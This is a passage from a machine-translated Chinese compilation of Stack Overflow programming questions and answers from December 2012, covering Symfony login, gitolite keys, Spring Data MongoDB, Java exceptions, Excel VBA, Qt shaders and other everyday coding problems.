    NSDictionary* def= @{ @"colorKey" : colorData, ... };
    [defaults registerDefaults: def];
} 
```

然后我提供了一种读取默认颜色的方法和一种设置它的方法：

```
- (NSColor*) color
{
    NSUserDefaults* defaults=[NSUserDefaults standardUserDefaults];
    NSData* colorData= [defaults objectForKey: colorKey];
    return [NSKeyedUnarchiver unarchiveObjectWithData: colorData];
}

- (void) setColor: (NSColor*) color
{
    NSUserDefaults* defaults=[NSUserDefaults standardUserDefaults];
    NSData* colorData= [NSKeyedArchiver archivedDataWithRootObject: color];
    [defaults setObject:colorData forKey: colorKey];
} 
```

但是如果在 color: 方法中打印颜色，有时它属于 NSColorWell 类，它会在应用程序内部造成麻烦。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:53:13.127

`NSColorWell`是`NSControl`根据[https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSColorWell_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSColorWell_Class/Reference/Reference.html)，所以看起来你错误地`setColor:`用`NSColorWell`实例而不是调用`NSColor`.

# symfony - 在 symfony 2 中强制登录

> ID：13957949
> 
> 赞同：0
> 
> 时间：2012-12-19T17:34:43.737
> 
> 标签：symfony

我正在尝试将 symfony2 与 facebook sdk 集成。我知道已经有一个很好的捆绑包，但我想开发自己的机制。

这是我解决这个问题的方法。使用 facebook 登录并授权我的应用程序后，facebook 会重定向到我事先指定的 url。该 url 映射到此控制器的方法：

```
 public function facebookLoginAction(Request $request) {
      $facebook = $this->get("facebook");
      $data = $facebook->api('/me', 'GET');
      if ($data) {
         $user = new AuthenticatedUser($data["name"], md5($data["id"]), "");
         $token = new UsernamePasswordToken($user, $data["id"], 'secured_area', $user->getRoles());
         $authToken = $this->get('security.authentication.manager')->authenticate($token);
         $this->get('security.context')->setToken($authToken);
      }
      return new Response("<pre>" . print_r($token, true));
   } 
```

通过这样做，我试图强制用户登录，以便当他或她从 facebook 回来时，他已经全部排序。

为了 compelteness 的缘故，这里的`AuthenticatedUser`代码：

```
namespace Nourdine\BasicBundle\Security\User;

    use Symfony\Component\Security\Core\User\UserInterface;

    class AuthenticatedUser implements UserInterface {

       private $username;
       private $password;
       private $salt;

       /**
        * @param string $username
        * @param string $password This md5-ied!
        * @param string $salt The salt is empty at the mo!
        */
       public function __construct($username, $password, $salt) {
          $this->username = $username;
          $this->password = $password;
          $this->salt = $salt;
       }

       public function getRoles() {
          return array("ROLE_USER");
       }

       public function getPassword() {
          return $this->password;
       }

       /**
        * @link http://symfony.com/doc/current/cookbook/security/custom_provider.html
        * If getSalt() returns nothing, then the submitted password is simply encoded using the algorithm you specify in security.yml
        */
       public function getSalt() {
          return $this->salt; // this is empty indeed
       }

       public function getUsername() {
          return $this->username;
       }

       public function eraseCredentials() {

       }

       public function equals(UserInterface $user) {
          if (!$user instanceof WebserviceUser) {
             return false;
          }
          if ($this->password !== $user->getPassword()) {
             return false;
          }
          if ($this->getSalt() !== $user->getSalt()) {
             return false;
          }
          if ($this->username !== $user->getUsername()) {
             return false;
          }
          return true;
       }
    } 
```

因为我知道这很重要，所以我想指出这`secured_area`是我的防火墙的名称！这里：

```
 <firewall name="secured_area" pattern="^/">
     <anonymous />
     <form-login login_path="/login" check_path="/login_check" />
     <logout path="/logout" target="/" />
  </firewall> 
```

也不是说在控制器中使用的名为“facebook”的服务只不过是`Facebook`来自官方 sdk 的类的一个实例。这是 services.xml 中的定义

```
 <service id="facebook" class="Facebook">
     <argument>%facebook.params%</argument>
  </service> 
```

任何想法？我做错了什么？用户提供者的概念是否以某种方式参与了这一切？即使登录实际上是强制的？

干杯

# ruby-on-rails - 检查 Facebook 身份验证码是否过期

> ID：13957951
> 
> 赞同：2
> 
> 时间：2012-12-19T17:34:49.810
> 
> 标签：ruby-on-rails, facebook, koala, koala-gem

我正在尝试遵守 12 月 5 日发布的新 Facebook 版本，并存储访问令牌。我在 Rails 中将 Koala gem 用于 Facebook API。

如果用户已退出 Facebook，但不是我们的应用程序，我会出现以下错误

```
Koala::Facebook::APIError (OAuthException: This authorization code has expired.): 
```

我以前只是这样称呼：

```
@oauth.get_user_info_from_cookies(cookies) 
```

但是现在 Facebook 只允许您调用一次……还有其他方法可以查看 cookie 是否过期？

# git - 授权密钥文件中的 Gitolite 用户名

> ID：13957954
> 
> 赞同：4
> 
> 时间：2012-12-19T17:35:12.223
> 
> 标签：git, gitolite, authorized-keys

我会尽力解释我的情况：

我在 debian 挤压服务器中使用 gitolite，并且有 3 个用户可以访问和使用存储库：

*   `alex@workbox`
*   `alex@homebox`
*   `katy@workbox`

以上是三个 Ubuntu 机器对应的用户名和主机名（Alex 在两个位置工作）。

我做的第一件事是添加`alex@workbox`到 gitolite：

1.  Alex 使用 ssh-keygen 生成了他的 ssh 密钥
2.  我将他的 ssh 密钥复制为 alex@workbox.pub 在我本地 gitolite-admin 克隆仓库的“keydir”文件夹中
3.  修改了我本地 gitolite-admin 克隆存储库的 conf/gitolite.conf 文件，以便让 alex@workbox RW 访问存储库：
    `repo project1`
    `RW+ = alex@workbox`
4.  照常做：
    *   `git add .`
    *   `git commit -m "Added alex@workbox"`
    *   `git push`

当 Alex 尝试克隆 project1 存储库时，出现一个错误，提示用户 " `alex`" 的访问被拒绝。
所以，我登录到服务器并打开`/var/lib/gitolite/.ssh/authorized_keys`.
文件的第一部分是这样的：

```
command="/usr/share/gitolite/gl-auth-command alex",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa... 
```

所以我手动替换`alex`为`alex@workbox`，保存了文件，这次 Alex 能够克隆存储库并毫无问题地使用它。

然后我按照上述步骤添加 Katy，在推送到之后`gitolite-admin`，我再次打开`authorized_keys`文件，看到 gitolite 将“ `user@hostname`”替换为“ `user`”。
所以它有`alex`而不是`alex@workbox`和相同的`katy`。
然后我不得不再次手动替换它并保存文件。我看到，对于我为`gitolite-admin`repo gitolite 所做的每次推送，都会将其中的每个“ `user@hostname`”替换为“ `user`”，`.ssh/authorized_keys`这样会使用户无法访问存储库。

我该怎么做才能让 gitolite 保持“ `user@hostname`”？
是否需要在服务器上进行配置或在我的本地克隆存储库上进行配置更改`gitolite-admin`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:15:09.883

配置**[语法](http://sitaramc.github.com/gitolite/syntax.html)**提到：

> 用户名和仓库名尽量简单；它们必须以字母数字开头，但之后还可以包含`.`、`_`或`-`.
> 
> 用户名可以选择**后跟 an`@`和 a`domainname`至少包含一个`.`**（这允许您使用电子邮件地址作为某人的用户名）。

您的命名约定不遵循具有“ `@`”的正确语法。

您可以在[`src/triggers/post-compile/ssh-authkeys`](https://github.com/sitaramc/gitolite/blob/master/src/triggers/post-compile/ssh-authkeys#L131-L145)

```
sub optionise {
    my $f = shift;

    my $user = $f;
    $user =~ s(.*/)(); # foo/bar/baz.pub -> baz.pub
    $user =~ s/(\@[^.]+)?\.pub$//; # baz.pub, baz@home.pub -> baz

    my @line = slurp($f);
    if ( @line != 1 ) {
        _warn "$f does not contain exactly 1 line; ignoring";
        return '';
    }
    chomp(@line);
    return "command=\"$glshell $user" . ( $kfn ? " $f" : "" ) . "\",$auth_options $line[0]";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-20T04:31:33.557

# spring-data-mongodb - 自定义存储库界面中的错误

> ID：13957957
> 
> 赞同：3
> 
> 时间：2012-12-19T17:35:22.317
> 
> 标签：spring-data-mongodb

我正在尝试在多模块 Maven 3 项目中使用 Spring Data for MongoDB 设置我的第一个 Java 应用程序。以下是相关版本：

*   爪哇 7
*   mongodb-win32-x86_64-2.2.0
*   Spring Data 1.1.1.RELEASE
*   Spring 3.2.0.RELEASE

我收到以下运行时错误：

```
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'actorFacade': Injection of autowired dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Could not autowire field: private es.mi.casetools.praetor.persistence.springdata.repositories.ActorRepository es.mi.casetools.praetor.facade.impl.DefaultActorFacade.actorRepository; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'actorRepository': FactoryBean threw exception on object creation; nested exception is org.springframework.data.mapping.PropertyReferenceException: No property insert found for type void
    at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:287)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1106)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:517)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:609)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:932)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)
    at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:106)
    at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:57)
    at org.springframework.test.context.support.AbstractDelegatingSmartContextLoader.delegateLoading(AbstractDelegatingSmartContextLoader.java:100)
    at org.springframework.test.context.support.AbstractDelegatingSmartContextLoader.loadContext(AbstractDelegatingSmartContextLoader.java:248)
    at org.springframework.test.context.TestContext.loadApplicationContext(TestContext.java:124)
    at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:148)
    ... 30 more 
```

* * *

在 google 中搜索我发现有同样问题的人，它似乎与自定义存储库有关。

这是我要存储为 mongo 文档的实体。

```
public class Actor {
    public enum ActorStereotype {
        SYSTEM, 
        PERSON
    }
        private String id;
    private String code; // unique
    private ActorStereotype stereotype;
    private String title; // Short title for the actor
    private String description;
    private String projectId; // project this actor belongs to

        // getters & setters 
```

标准存储库接口。

```
public interface ActorRepository extends MongoRepository<Actor, String>, ActorRepositoryCustom {
} 
```

自定义界面（我认为错误所在的位置）。

```
@NoRepositoryBean
public interface ActorRepositoryCustom {
    void updateSingleActor(Actor actor);
    void insertActor(Actor actor);
} 
```

自定义接口实现。

```
public class ActorRepositoryCustomImpl implements ActorRepositoryCustom {
    @Autowired
    private MongoTemplate mongoTemplate;

    @Override
    public void updateSingleActor(Actor actor) {
        if(actor.getId() != null) 
            throw new MissingIdException();

        // TODO change to Spring Converter
        DBObject dbo = (DBObject)mongoTemplate.getConverter().convertToMongoType(actor);

        mongoTemplate.updateFirst(query(where("_id").is(actor.getId())), 
                Update.fromDBObject(dbo, new String[]{}), 
                Actor.class);
    }

    @Override
    public void insertActor(Actor actor) {  
        if(actor.getId() != null) 
            throw new IdProvidedException();

        mongoTemplate.save(actor);
    }

} 
```

最后是应用程序上下文。

```
 <context:annotation-config/>

    <bean id="propertyConfigurer"       class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
        <property name="locations">
            <list>
                <value>classpath:properties/test.properties</value>
            </list>
        </property>
    </bean>

    <!-- mongodb configuration -->          
    <mongo:repositories base-package="es.mi.casetools.praetor.persistence.springdata.repositories" 
        mongo-template-ref="mongoTemplate" repository-impl-postfix="Impl">                  
        <repository:exclude-filter type="annotation" expression="org.springframework.data.repository.NoRepositoryBean"/>    
    </mongo:repositories>

    <mongo:mongo id="mongotest" host="${mongo.host}" port="${mongo.port}" write-concern="SAFE">
    </mongo:mongo>

    <mongo:db-factory dbname="${mongo.dbname}" mongo-ref="mongotest"/>

    <bean id="mongoTemplate" class="org.springframework.data.mongodb.core.MongoTemplate">
        <constructor-arg name="mongoDbFactory" ref="mongoDbFactory"/>
    </bean> 
    <bean id="actorFacade" class="es.mi.casetools.praetor.facade.impl.DefaultActorFacade">
    </bean>

</beans> 
```

我还有一个小的 Spring 测试，无法加载上述应用程序上下文，给出了我在顶部附近列出的异常。

我尝试添加以下内容，但我得到了同样的异常。

```
<bean id="actorRepositoryCustomImpl" class="es.mi.casetools.praetor.persistence.springdata.repositories.ActorRepositoryCustomImpl"></bean> 
```

有人知道错误可能是什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-21T08:58:59.853

米格尔的评论解决了这个问题。我给实现类起错了名字。我已经看到了类似的问题，所以我会尝试澄清解决方案，希望它可以帮助其他人。

我有以下接口定义

```
public interface ActorRepository extends MongoRepository<Actor, String>, ActorRepositoryCustom 
```

自定义接口定义如下所示：

```
public interface ActorRepositoryCustom 
```

所以我的错误是命名`ActorRepositoryCustom`with的实现`ActorRepositoryCustomImpl`，期望 Springdata 会选择实现，因为它的后缀是默认的*Impl*。问题是，Springdata`ActorRepositoryImpl`默认会查找，即使您正在实现的是`ActorRepositoryCustom`. 解决方案是使用可选属性`repository-impl-postfix`并将其设置为`CustomImpl`.

# java - 未处理的异常类型 IOException

> ID：13957961
> 
> 赞同：1
> 
> 时间：2012-12-19T17:35:34.680
> 
> 标签：java, file-io, io, ioexception

> **可能重复：**
> [为什么我得到“未处理的异常类型 IOException”？](https://stackoverflow.com/questions/2305966/why-do-i-get-the-unhandled-exception-type-ioexception)

我正在尝试使用以下算法求解 Euler #8。问题是，每当我修改我有巨大注释的行时，错误`Unhandled Exception Type IOException`出现在我用注释标记的每一行上`//###`。

```
private static void euler8()
{   
    int c =0;
    int b;
    ArrayList<Integer> bar = new ArrayList<Integer>(0);
    File infile = new File("euler8.txt");
    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(
                            new FileInputStream(infile), //###
                            Charset.forName("UTF-8")));
        while((c = reader.read()) != -1) { //###
          char character = (char) c;
          b = (int)character;
          bar.add(b); /*When I add this line*/
        }
    reader.close(); //###
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:37:05.400

是的，`IOException`是一个*检查异常*，这意味着你要么需要捕获它，要么声明你的方法也会抛出它。如果抛出异常，你*想发生什么？*

请注意，无论如何，您通常都应该关闭`reader`in`finally`块，以便即使在遇到另一个异常时它也会关闭。

有关已检查和未检查异常的更多详细信息，请参阅[有关异常的 Java 教程课程。](http://docs.oracle.com/javase/tutorial/essential/exceptions/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:39:00.967

一种解决方案：更改为

```
private static void euler8() throws IOException { 
```

但是调用方法必须捕获 IOException。

或捕捉异常：

```
private static void euler8()
{   
    int c =0;
    int b;
    ArrayList<Integer> bar = new ArrayList<Integer>(0);
    BufferedReader reader;
    try { 
        File inFile = new File("euler8.txt");
        reader = new BufferedReader(
                            new InputStreamReader(
                            new FileInputStream(infile), //###
                            Charset.forName("UTF-8")));
        while((c = reader.read()) != -1) { //###
          char character = (char) c;
          b = (int)character;
          bar.add(b); /*When I add this line*/
        }
    } catch (IOException ex) {
       // LOG or output exception
       System.out.println(ex);
    } finally {
        try {
           reader.close(); //###
        } catch (IOException ignored) {}
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:37:38.687

包装在 try/catch 块中以捕获异常。

如果您不这样做，它将无法处理。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:37:47.597

如果您无法读取指定的文件会怎样？这`FileInputStream`将引发异常，Java 要求您必须检查并处理它。

这种类型的异常称为*检查*异常。*存在未经检查*的异常，Java 不需要您处理这些异常（主要是因为它们无法处理 - 例如`OutOfMemoryException`）

请注意，您的处理可能包括抓住它并忽略它。这不是一个好主意，但 Java 无法真正确定 :-)

# seo - 谷歌每天如何看到更新的内容？

> ID：13957966
> 
> 赞同：0
> 
> 时间：2012-12-19T17:35:56.067
> 
> 标签：seo, search-engine

我有一个每天更新内容的网站。我有两个问题：

1.  谷歌如何看到这个内容？在这种情况下我需要 SEO 吗？

2.  404错误页面对搜索引擎排名有影响吗？（我没有静态页面）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:12:22.660

所以谷歌可以“知道”内容应该每天更新，它可能有用（如果你还没有这样做）实施站点地图（并在必要时动态更新）。在此 simemap 中，您可以为每个页面指定更新周期。这对谷歌没有限制，但它可以帮助调整索引机器人访问的频率。如果你这样做，你必须对谷歌“诚实”关于时间更新。如果 Google 意识到站点地图中定义的频率与实际频率不对应，则可能对您的排名不利。

404 错误（和其他 HTTP 错误）实际上可能间接地对网站的排名产生不利影响。当然，如果机器人在给定的时刻不能访问内容，它就不能被索引。但有人嗤之以鼻，如果网络爬虫在访问你的网站过程中遇到太多问题，谷歌会将访问频率调整为下行。

您可以获得一些个性化的建议，并使用 Google 网站管理员工具（以及在较小程度上，分析或任何其他可以监控网络爬虫访问的工具）来监控您的网站的索引过程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T05:46:39.610

您可以查看 Google 上次访问您的页面的日期和时间。因此，您可以看到 Google 是否调整了您更新的内容。如果您的网站每天都有更新的内容，那么您可以将您的网站 ping 到许多搜索引擎，也可以在 Google 中提交您的网站。

您可以仅为那些每天更新内容并提交给谷歌网站管理员工具的网址制作站点地图。您可以在标签中定义上次修改 url 的日期和时间。您还可以提示您的页面在标签下更改的频率。您可以在标签下为每天修改的页面设置高优先级。

如果您有 404 错误（未找到文件）页面，则将它们放在一个目录中并在您的 robots.txt 文件中定义它。因此，Google 不会抓取该网页，并且不会自动将其编入索引。它不会对您的 SERP 排名产生任何影响。

# c++ - 试图读取配置文件

> ID：13957968
> 
> 赞同：0
> 
> 时间：2012-12-19T17:36:06.593
> 
> 标签：c++

提前对格式表示抱歉。想不通...

我通过参数将配置文件传递给程序

我正在尝试从特定参数中读取值

我有一个 cofigReader 类，它具有以下方法，用于从给定特定参数的配置文件中返回字符串

我的问题，

它永远找不到参数。found 是 0 或 -1....

```
string configReader::value(string config_file, string parameter)
{
    string value;
    char config_delimiter = '=';
    size_t found;
    file.open(config_file);
    std::string line;
    bool param_found = false;
    while(param_found == false){
        while (!file.eof())
        {       
            getline(file,line);
            logger.writetolog("INFO","Looking for " + parameter +
                         " on line "+ line); 
            found = line.find(parameter);
            logger.writetolog("INFO",int(found));
            if(found!=string::npos){
                param_found = true;
            }
        }
        param_found = true;
    }
    if (found!=string::npos)
    {   
        size_t a = line.find(config_delimiter)+1;
        logger.writetolog("INFO","Found" + parameter + 
                   "splitting string at delimter" + config_delimiter + 
                   " and return right side value");     
        value = line.substr(a);
        return value;
    }
    else
    {
        return value;
    }
    file.close();
} 
```

更多信息。配置文件长这样。

```
toemail=someemailaddress@gmail.com
outputdir=C:\tmp 
```

像这样使用的 configReader 类

```
//attempt to parse out the required parameters for the program
string toemail = config.value(configFileArg,"toemail"); 
```

它总是返回空

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:40:02.060

`while (!file.eof())`找到匹配项后循环继续，覆盖`found`稍后检查的值。

您可以通过将循环更改为类似的方式来解决此问题

```
bool param_found = false;
while (!param_found && !file.eof()) {       
    if (getline(file,line)) {
        break;
    }
    logger.writetolog("INFO","Looking for " + parameter +" on line "+ line); 
    found = line.find(parameter);
    logger.writetolog("INFO",int(found));
    if(found!=string::npos){
        param_found = true;
        break;
    }
} 
```

反而。（请注意，此代码删除了您的 while(param_found == false) 循环。正如 sftrabbit 指出的那样，该循环是不必要的。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:46:13.380

编写循环的惯用方法是：

```
bool param_found = false;

while (std::getline(file,line)) //<-- this is idiomatic loop!
{                               //successfully read OR exit from the loop

    logger.writetolog("INFO","Looking for " + parameter +" on line "+ line); 
    found = line.find(parameter);
    logger.writetolog("INFO",int(found));
    if(found!=string::npos){
        param_found = true;
        break;
    }
} 
```

`eof()`编写循环时不应使用：

*   [为什么循环条件内的 iostream::eof 被认为是错误的？](https://stackoverflow.com/questions/5605125/why-is-iostreameof-inside-a-loop-condition-considered-wrong)
*   [从 C++ 文件中读取行的首选模式是什么？](https://stackoverflow.com/questions/7219062/whats-preferred-pattern-for-reading-lines-from-a-file-in-c)

这两个主题详细讨论了这一点。

# qt - 如何使 qt 中的着色器像在 es2（iOS）中一样编译和工作？

> ID：13957970
> 
> 赞同：1
> 
> 时间：2012-12-19T17:36:06.997
> 
> 标签：qt, opengl-es-2.0, glsl

1.  我有一个适用于 iOS 应用程序的渲染引擎。
2.  我几乎设法通过从带有 QGLWidget 的 qt(4.8) 应用程序调用相同的 openGL 渲染引擎来使其工作。为了支持 es2 功能集，我的小部件还继承了 QGLFunctions。

但是我仍然对着色器有问题：我无法在 qt 上使用 glCompileShader 编译它们，因为几乎每个关键字（lowp、vec4、vec2 ...）都返回编译错误。所以我用QGLShader程序编译它，但我必须指定“#version 120”，最接近es2。但是，我的精灵没有显示正确的大小，唯一可能影响 iOS 的不同代码片段是在着色器编译/版本中。我认为着色器中的问题是 gl_PointSize 没有改变 qt 的顶点着色器编译中的任何内容。

有没有更好的方法让我像在 iOS 上一样在 qt 上编译着色器？（我知道 glsl es2 版本来自版本 120，但我不知道它们在多大程度上不同）。

我的着色器在 iOS 上运行良好，但在 Qt 上运行良好：

```
const GLchar vShaderStr[] =
#ifdef  QT_OPENGL_LIB
"#version 120\n"
#endif //QT_OPENGL_LIB
"attribute lowp vec4 Position;\n"
"attribute mediump vec2 TextureCoord;\n"
"attribute lowp float Weight;\n"
"uniform mat4 MVP;\n"
"varying mediump vec2 TextureCoordOut;\n"
"void main(void)\n"
"{\n"
"  gl_Position = MVP * Position;\n"
"  TextureCoordOut = TextureCoord;\n"
"  gl_PointSize = Weight;\n"
"}\n";

const GLchar fShaderStr[] =
#ifdef  QT_OPENGL_LIB
"#version 120\n"
#endif //QT_OPENGL_LIB
"varying mediump vec2 TextureCoordOut;\n"
"uniform sampler2D Sampler;\n"
"uniform bool IsSprite;\n"
"uniform lowp vec3 TextureColor;\n"
"uniform lowp float Opacity;\n"
"void main(void)\n"
"{\n"
"   lowp vec4 textureColorResult;\n"
"   textureColorResult = texture2D(Sampler,  IsSprite ? gl_PointCoord : TextureCoordOut);\n"
"   gl_FragColor = IsSprite ? vec4(mix(textureColorResult.rgb,TextureColor, 1.0),\n"
"                    textureColorResult.a * Opacity) : textureColorResult;\n"
"}\n"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T11:38:57.867

终于解决了这个问题！

我保留了#version 120，并发现了它在设备上工作时缺少的东西。在使用 qt（现在为 5.0）的桌面上，您必须激活以下在 iOS 上似乎默认的 gl 功能：

```
 glEnable(GL_POINT_SPRITE);
  glEnable(GL_VERTEX_PROGRAM_POINT_SIZE); 
```

# vba - 删除特定字符后单元格中的数据

> ID：13957975
> 
> 赞同：10
> 
> 时间：2012-12-19T17:36:41.413
> 
> 标签：vba, excel

我在单元格 A1:A1000 中有数据。它是一个名称列表，后跟一个小注释，如下所示：

*   山姆“快
*   尼克长
*   汤姆“快

它们都`"`在名称后有一个空格，然后是注释。我要做的是删除名称后的所有内容。

我正在玩宏来尝试这样做，但无法得到任何工作。知道我该怎么做吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-19T17:45:48.063

这是一个没有宏的绝妙技巧：

选择适当的范围（或者甚至只需单击`A`以选择整个列），然后执行`Ctrl+F`，单击`Replace`，`Find`准确写入`"*`并将`Replace with`框留空。现在点击`Replace all`和tada！

它将引号之后（包括）的所有内容替换为空，因为它`*`用作通配符，您将替换框留空。

编辑：这里建议的是 VBA 代码：

```
Columns("A:A").Replace What:="""*", Replacement:="", LookAt:=xlPart 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-19T17:49:46.247

**简单的！**我不知道您使用的是哪个版本的 Excel，但简而言之，您想做 a`Convert Text to Columns`然后使用`"`. 这将为您留下两列，一列是您想要的数据，另一列您可以删除。

以下是 Office 2010 中的演练：

1.  突出显示 A 列
2.  找到`Data`菜单
3.  找到`Convert Text to Columns`菜单
4.  挑选`Delimited`并击打`next`
5.  在`Other`框中，键入`"`
6.  打`Finish`

**完毕！**现在你的所有名字都在 A 列中，你可以删除 B 列。

总而言之，执行“将文本转换为列”，然后使用`"`. 超级简单快捷。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-19T18:16:23.000

几个选项：

**代替**

```
Range("A1:A1000").Replace """*", vbNullString 
```

如果您需要进一步操作该值，则以下更合适：

**使用正则表达式：**

```
Dim str As String, strClean As String
Dim cell As Range

For Each cell In Range("A1:A1000")

    With CreateObject("vbscript.regexp")
        .Pattern = "\""(.*)"
        .Global = True
        cell = .Replace(cell, vbNullString)
    End With

Next cell 
```

**没有正则表达式，拆分字符串：**

```
Dim strSplit() As String
Dim cell As Range

For Each cell In Range("A1:A1000")

    If (cell.Value <> vbNullString) Then

        cell.Value = Split(cell.Value, """")(0)

    End If

Next cell 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-19T21:38:33.650

如果您想保留源数据，也可以使用下一列中的简单 Excel 公式来完成。假设您的数据在 A 列中，以下公式将仅返回名称：`=LEFT(A1,SEARCH("""",A1)-1)`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-19T17:49:22.560

```
Sub Macro1()
    For Row = 1 To 1000
       S = Range("A" & Row).Cells.Value
       Pos = InStr(S, Chr(34))
       If Pos > 0 Then Range("A" & Row).Cells.Value = Left(S, Pos - 1)
    Next
End Sub 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-09-12T13:34:25.637

按`ctrl + f`，单击`replace tab`，`*`在`find what`框中键入，然后单击`replace all`。不需要在`replace`盒子里放任何东西。在这里，您将替换之后的所有内容`.`。

# javascript - 只有当标签/浏览器窗口被聚焦时，javascript 才应该运行

> ID：13957980
> 
> 赞同：8
> 
> 时间：2012-12-19T17:37:01.833
> 
> 标签：javascript, jquery, html

> **可能重复：**
> [检测浏览器选项卡是否有焦点](https://stackoverflow.com/questions/7389328/detect-if-browser-tab-has-focus)

我有一个捕获客户端屏幕的简单 Java 小程序。在一段 javascript 代码的帮助下，我能够调用小程序并捕获活动屏幕图片。

但是，即使它只通过单击按钮捕获活动屏幕，用户也可能通过在捕获过程中使用 ALT TAB 切换到其他选项卡来操纵该过程。我想确保只有在加载页面并且页面被聚焦时才必须进行捕获。

到目前为止，我发现这段 javascript 代码似乎无法正常工作。有时即使页面已最小化，它也会卡在焦点上。

```
<script language="javascript">
     window.onpageshow = function(e) { console.log('pageshow'); };
     window.onfocus = function(e) { console.log('focus'); };
</script> 
```

那么对于我想要实现的目标或任何其他解决方案是否有任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:40:58.067

尝试使用`document.hidden`它作为[页面可见性 API的一部分](http://davidwalsh.name/page-visibility)

# c# - 从不同范围更改变量值

> ID：13957982
> 
> 赞同：-1
> 
> 时间：2012-12-19T17:37:07.410
> 
> 标签：c#, winforms

如果我有 Form1 和 Form2，并且我`button1_Click`在 Form1 中有事件，那么：

```
System.Void button1_Click(System.Object  sender, System.EventArgs  e) {
static boolean x= false;
..
..
Form2.Show();
} 
```

我想在关闭Form2时，把x = true，怎么做

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:42:23.340

```
Form2 otherForm = new Form2();
bool x = false;
otherForm.FormClosing += (s,args)=> x = true; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:43:06.667

您需要更改`x`为公共静态`property`或`field`. `x`应该在类级别声明以使其对其他类可见。

然后，只需根据需要从 From2 更新静态属性。

# javascript - 为什么当函数被顺序调用时，作为函数参数传递的 Javascript 数组可能会丢失其内容？

> ID：13957985
> 
> 赞同：4
> 
> 时间：2012-12-19T17:37:15.613
> 
> 标签：javascript, arrays, function, parameters, couchdb

我在这里坐了一会儿，现在想知道为什么在第二次调用函数调用时会丢失数组参数。

我正在处理的脚本在 CouchDB/PouchDB 之后映射，并将项目作为 JSON 字符串存储在多个存储（包括本地存储）中。参数是：

```
_id         id of the item
_rev        revision string (version), counter and hash
_content    whatever content
_revisions  array of all prior hashes and current counter
_revs_info  all previous revisions of this item with status 
```

我目前正在尝试`PUT`默认更新现有文档的操作。当我使用多个存储时，我还有一个`PUT SYNC`，它将文档的版本从一个存储“复制和粘贴”到另一个存储（目标是每个存储都可以使用每个版本）。我还保留了一个带有文档树的单独文件，其中存储了所有版本的哈希值。此树文件`SYNCs`使用`_revs_info`随`PUT`.

我的问题是顺序的`SYNC PUTs`。第一个有效，第二个我丢失了`_revs_info`参数。而且我不知道为什么...

这是我的第一个电话（来自我的 QUnit 模块），效果很好：

```
o.jio.put({
    "content":'a_new_version',
    "_id":'myDoc',
    "_rev":"4-b5bb2f1657ac5ac270c14b2335e51ef1ffccc0a7259e14bce46380d6c446eb89",
    "_revs_info":[
        {"rev":"4-b5bb2f1657ac5ac270c14b2335e51ef1ffccc0a7259e14bce46380d6c446eb89","status":"available"},
        {"rev":"3-a9dac9ff5c8e1b2fce58e5397e9b6a8de729d5c6eff8f26a7b71df6348986123","status":"deleted"},
        {"rev":fake_rev_1,"status":"deleted"},
        {"rev":fake_rev_0,"status":"deleted"}
        ],
    "_revisions":{
        "start":4,
        "ids":[
            "b5bb2f1657ac5ac270c14b2335e51ef1ffccc0a7259e14bce46380d6c446eb89",
